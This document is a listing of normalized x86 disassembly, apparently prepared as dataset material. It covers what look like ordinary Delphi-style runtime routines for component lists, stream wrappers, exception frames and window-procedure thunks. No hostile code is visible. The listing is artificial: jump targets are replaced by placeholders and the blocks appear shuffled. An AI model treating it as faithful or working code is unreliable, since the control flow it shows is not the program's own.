add esp 0xc
sub_41e1f0
push ebx
push esi
push ecx
call sub_403a8c
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_41e444
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_41e3ec
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_416a58
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41e3b4
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403a74
lea eax [ ebx + 0x14 ]
call sub_40dabc
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4161a0
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41e274
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4161fc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_416044
mov edx ebx
mov eax esi
call sub_41e274
sub_41e308
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_416044
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x10 ] eax
sub_41e334
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_416340
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_4036c0
xor eax eax
mov [ ebx + 0x10 ] eax
sub_41e35c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4038bc
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_41e308
mov dl 0x1
mov eax ebx
call sub_41e87c
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41e82c
sub_41e3b4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41e87c
mov edx ebx
mov eax esi
call sub_41e334
pop edi
pop esi
pop ebx
retn
sub_41e3ec
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_416288
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41e3b4
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_41e334
sub_41e444
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4161a0
call sub_41e444
inc edi
dec esi
jne r-xdata
sub_41e480
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_416340
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_4036c0
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41e4a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41e480
mov edx ebx
mov eax esi
call sub_41e480
pop esi
pop ebx
retn
sub_41e4c0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41e4a4
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4161a0
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_41e51c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_41e2c8
push ebx
push sub_41e2f0
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_41e2dc
push ebx
push sub_41e2fc
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41e614
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40873c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_41e6ac
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
sub_41e6ac
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4161a0
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_40873c
test al al
jne r-xdata
sub_41e6fc
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_404828
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_408a28
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
xor edx edx
mov eax ebx
call sub_41e87c
mov edx esi
mov eax ebx
call sub_41e788
mov dl 0x1
mov eax ebx
call sub_41e87c
sub_41e79c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4161a0
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41612c
sub_41e7d8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_4161fc
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_416090
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_41621c
sub_41e82c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41e7c8
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41e79c
mov cl 0x1
mov edx ebx
call sub_41e82c
inc edi
dec ebp
jne r-xdata
sub_41e87c
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4046c0
mov edx esp
mov eax esi
call sub_4039d4
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41e8c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41e8ec
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41e934
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403774
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41e994
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41e9b8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_41ea00
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
mov edx esi
call sub_41ec50
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_41ea4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x30 ]
cmp esi eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_4038bc
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov [ eax + 0x30 ] esi
call sub_41e4a4
test esi esi
je r-xdata
mov edx [ ebx + 0x10 ]
mov eax esi
call sub_41e274
sub_41ea88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41ec50
mov edx ebx
mov eax esi
call sub_41ec44
sub_41eacc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e1a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_41eb10
push ebx
push esi
push edi
call sub_403a8c
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41e1f0
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41e4a4
jmp r-xdata
mov eax esi
call sub_416288
mov edx eax
mov eax edi
call sub_41ec50
lea eax [ edi + 0x50 ]
call sub_40dabc
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403a74
sub_41eb70
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41e4c0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41eb9c
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41ebb8
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41ebd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4161a0
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41ec50
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_416090
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4161a0
cmp ebp eax
jne r-xdata
sub_41ec90
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_41ecd8
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_4036c0
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_41ed10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41ed5f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41ed78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41edc7
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41ede0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41ee4a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41ee64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41eeae
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_418964
mov eax [ ebx + 0xc ]
call sub_418914
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41eec8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_406204
xor eax eax
push ebp
push sub_41f0b5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41f08e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_402744
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41f07d
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_402764
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403f38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f0bc
lea eax [ ebp + 0xc ]
call sub_406194
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403f38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41f0f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41f15c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
call sub_418914
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41f18c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_416834
mov edi eax
xor eax eax
push ebp
push sub_41f1e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1e8
mov eax [ rw-data ]
call sub_416898
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4161a0
call sub_4036c0
inc esi
dec ebx
jne r-xdata
sub_41f200
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41f228
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028fc
mov edx sub_41f200
lea eax [ esi + 0x5 ]
call sub_41f220
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41f220
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41f2e4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x80000000
push r-xdata
mov eax [ rw-data ]
push eax
push 0x80
call CreateWindowExA
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f228
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41f398
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41f2c0
sub_41f3c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41f45f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f466
retn
mov eax [ rw-data ]
call sub_415784
mov eax [ rw-data ]
call sub_40d7e4
call sub_41f18c
xor edx edx
xor eax eax
call sub_419808
mov eax rw-data
call sub_40dabc
call sub_4067f8
lea eax [ eax + 0xc ]
call sub_40dabc
mov eax rw-data
call sub_40dabc
mov eax rw-data
call sub_40dabc
mov eax sub_41f1f8
